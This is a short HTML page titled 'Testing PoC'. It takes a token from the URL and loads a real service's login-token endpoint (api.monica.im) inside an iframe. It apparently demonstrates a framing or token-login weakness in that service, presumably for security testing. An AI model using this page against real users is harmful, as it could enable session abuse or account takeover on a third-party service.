<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Testing PoC</title>
  <style>
    body { font-family: ui-monospace, monospace; background: #111; color: #0f0; padding: 1.5rem; max-width: 720px; margin: 0 auto; }
    h1 { font-size: 1.1rem; font-weight: normal; color: #888; margin: 0 0 1rem; }
    iframe { display: block; width: 100%; height: 100px; border: 1px solid #333; background: #0a0a0a; }
    .status { margin: 0.5rem 0; font-size: 0.9rem; }
    .ok { color: #0f0; }
    .err { color: #f44; }
  </style>
</head>
<body>
  <h1>Testing PoC</h1>
  <iframe id="f" title="poc"></iframe>
  <div class="status" id="s">…</div>

  <script>
    (function () {
      var p = new URLSearchParams(location.search);
      var t = p.get('iframe_token');
      if (t === null || t === '') t = 'DEMO_NO_SECRET';
      var u = 'https://api.monica.im/api/user/login_token?token=' + encodeURIComponent(t);
      var frame = document.getElementById('f');
      var st = document.getElementById('s');
      frame.addEventListener('load', function () { st.innerHTML = '<span class="ok">load</span>'; });
      frame.addEventListener('error', function () { st.innerHTML = '<span class="err">error</span>'; });
      frame.src = u;
    })();
  </script>
</body>
</html>
